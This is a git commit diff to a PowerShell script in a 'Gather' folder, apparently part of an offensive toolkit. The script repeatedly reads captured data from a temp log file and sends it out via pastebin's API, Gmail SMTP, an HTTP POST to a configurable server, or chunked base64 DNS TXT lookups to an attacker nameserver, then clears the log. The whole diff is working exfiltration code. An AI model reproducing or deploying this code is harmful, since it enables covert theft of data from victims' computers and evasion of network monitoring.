5c7f814e2c262957bd2e2f17313acf0c134d3e3b
smarshallhb <smarshal@caltech.edu>
2017-07-23 20:33:26 -0400

    Update qeybog.ps1

--- Gather/qeybog.ps1
+++ Gather/qeybog.ps1
@@ -187,93 +187,92 @@ function script:qeybog
 
         $check = 0
         while($true) 
-        { 
-            $read = 0
-            Start-Sleep -Seconds 15 
-            $pastevalue=Get-Content $env:temp\citr.log 
+        {
+            Start-Sleep -Seconds 25
+            $pastevalue=Get-Content $env:temp\citr.log
             $read++
-            if ($read -eq 30)
+            if ($read -eq 15)
             {
+                $now = Get-Date;
+                $name = $env:COMPUTERNAME 
+                $pastename = $name + "" + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
+                function post_http($url,$parameters) 
+                {
+                    $http_request = New-Object -ComObject Msxml2.XMLHTTP 
+                    $http_request.open("POST", $url, $false) 
+                    $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
+                    $http_request.setRequestHeader("Content-length", [String]$parameters.length); 
+                    $http_request.setRequestHeader("Connection", "close") 
+                    $http_request.send([String]$parameters) 
+                    $script:session_key=$http_request.responseText 
+                } 
+
+                function Compress-Encode
+                {
+                    #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
+                    $ms = New-Object IO.MemoryStream
+                    $action = [IO.Compression.CompressionMode]::Compress
+                    $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
+                    $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
+                    $pastevalue | ForEach-Object {$sw.WriteLine($_)}
+                    $sw.Close()
+                    # Base64 encode stream
+                    $code = [Convert]::ToBase64String($ms.ToArray())
+                    return $code
+                }
+
+                if ($exfiloption -eq "pastebin")
+                {
+                    $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
+                    $pastevalue = [System.Convert]::ToBase64String($utfbytes)
+                    post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
+                    post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
+                }
+
+                elseif ($exfiloption -eq "gmail")
+                {
+                    #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
+                    $smtpserver = "smtp.gmail.com"
+                    $msg = new-object Net.Mail.MailMessage
+                    $smtp = new-object Net.Mail.SmtpClient($smtpServer )
+                    $smtp.EnableSsl = $True
+                    $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
+                    $msg.From = "$username@gmail.com"
+                    $msg.To.Add("$username@gmail.com")
+                    $msg.Subject = $pastename
+                    $msg.Body = $pastevalue
+                    if ($filename)
+                    {
+                        $att = new-object Net.Mail.Attachment($filename)
+                        $msg.Attachments.Add($att)
+                    }
+                    $smtp.Send($msg)
+                }
+
+                elseif ($exfiloption -eq "webserver")
+                {
+                    $Data = Compress-Encode    
+                    post_http $URL $Data
+                }
+                elseif ($ExfilOption -eq "DNS")
+                {
+                    $lengthofsubstr = 0
+                    $code = Compress-Encode
+                    $queries = [int]($code.Length/63)
+                    while ($queries -ne 0)
+                    {
+                        $querystring = $code.Substring($lengthofsubstr,63)
+                        Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $ExfilNS"
+                        $lengthofsubstr += 63
+                        $queries -= 1
+                    }
+                    $mod = $code.Length%63
+                    $query = $code.Substring($code.Length - $mod, $mod)
+                    Invoke-Expression "nslookup -querytype=txt $query.$DomainName $ExfilNS"
+
+                }
                 Out-File -FilePath $env:temp\citr.log -Force -InputObject " " 
                 $read = 0
-            }
-            $now = Get-Date; 
-            $name = $env:COMPUTERNAME 
-            $pastename = $name + "" + $now.ToUniversalTime().ToString("dd/MM/yyyy HH:mm:ss:fff")
-            function post_http($url,$parameters) 
-            {
-                $http_request = New-Object -ComObject Msxml2.XMLHTTP 
-                $http_request.open("POST", $url, $false) 
-                $http_request.setRequestHeader("Content-type","application/x-www-form-urlencoded") 
-                $http_request.setRequestHeader("Content-length", [String]$parameters.length); 
-                $http_request.setRequestHeader("Connection", "close") 
-                $http_request.send([String]$parameters) 
-                $script:session_key=$http_request.responseText 
-            } 
-
-            function Compress-Encode
-            {
-                #Compression logic from http://www.darkoperator.com/blog/2013/3/21/powershell-basics-execution-policy-and-code-signing-part-2.html
-                $ms = New-Object IO.MemoryStream
-                $action = [IO.Compression.CompressionMode]::Compress
-                $cs = New-Object IO.Compression.DeflateStream ($ms,$action)
-                $sw = New-Object IO.StreamWriter ($cs, [Text.Encoding]::ASCII)
-                $pastevalue | ForEach-Object {$sw.WriteLine($_)}
-                $sw.Close()
-                # Base64 encode stream
-                $code = [Convert]::ToBase64String($ms.ToArray())
-                return $code
-            }
-
-            if ($exfiloption -eq "pastebin")
-            {
-                $utfbytes  = [System.Text.Encoding]::UTF8.GetBytes($Data)
-                $pastevalue = [System.Convert]::ToBase64String($utfbytes)
-                post_http "https://pastebin.com/api/api_login.php" "api_dev_key=$dev_key&api_user_name=$username&api_user_password=$password" 
-                post_http "https://pastebin.com/api/api_post.php" "api_user_key=$session_key&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pastename&api_paste_code=$pastevalue&api_paste_private=2" 
-            }
-        
-            elseif ($exfiloption -eq "gmail")
-            {
-                #http://stackoverflow.com/questions/1252335/send-mail-via-gmail-with-powershell-v2s-send-mailmessage
-                $smtpserver = "smtp.gmail.com"
-                $msg = new-object Net.Mail.MailMessage
-                $smtp = new-object Net.Mail.SmtpClient($smtpServer )
-                $smtp.EnableSsl = $True
-                $smtp.Credentials = New-Object System.Net.NetworkCredential("$username", "$password");
-                $msg.From = "$username@gmail.com"
-                $msg.To.Add("$username@gmail.com")
-                $msg.Subject = $pastename
-                $msg.Body = $pastevalue
-                if ($filename)
-                {
-                    $att = new-object Net.Mail.Attachment($filename)
-                    $msg.Attachments.Add($att)
-                }
-                $smtp.Send($msg)
-            }
-
-            elseif ($exfiloption -eq "webserver")
-            {
-                $Data = Compress-Encode    
-                post_http $URL $Data
-            }
-            elseif ($ExfilOption -eq "DNS")
-            {
-                $lengthofsubstr = 0
-                $code = Compress-Encode
-                $queries = [int]($code.Length/63)
-                while ($queries -ne 0)
-                {
-                    $querystring = $code.Substring($lengthofsubstr,63)
-                    Invoke-Expression "nslookup -querytype=txt $querystring.$DomainName $ExfilNS"
-                    $lengthofsubstr += 63
-                    $queries -= 1
-                }
-                $mod = $code.Length%63
-                $query = $code.Substring($code.Length - $mod, $mod)
-                Invoke-Expression "nslookup -querytype=txt $query.$DomainName $ExfilNS"
-
             }
 
             $check++
